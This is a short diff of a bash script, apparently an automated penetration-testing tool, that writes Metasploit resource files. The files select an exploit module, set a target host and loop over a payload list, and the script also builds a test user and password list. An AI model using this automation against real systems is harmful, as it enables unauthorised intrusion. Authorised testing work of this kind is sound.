@@ -574,8 +574,8 @@ function RUNMSF()
 function CREATERC()
 {
 	myhost=$(ifconfig | grep broadcast | awk '{print $2}')
-	echo "search $1" > ZX301/$OUTPUT/vulners/rc/$1.rc
-	echo "use 0" >> ZX301/$OUTPUT/vulners/rc/$1.rc
+	#echo "search $1" > ZX301/$OUTPUT/vulners/rc/$1.rc
+	echo "use exploit/$1" > ZX301/$OUTPUT/vulners/rc/$1.rc
 	echo "set rhosts $2" >> ZX301/$OUTPUT/vulners/rc/$1.rc
 	echo "<ruby>" >> ZX301/$OUTPUT/vulners/rc/$1.rc
 	echo "File.foreach(\"payloads.lst\") do |tgtpl|" >> ZX301/$OUTPUT/vulners/rc/$1.rc
@@ -639,8 +639,6 @@ function RUN()
 	esac
 }
 
-#Some fake password list for testing purpose
-#
 function CREATEPASSWORDLIST()
 {
 	echo "[****] Creating test user/pass list"
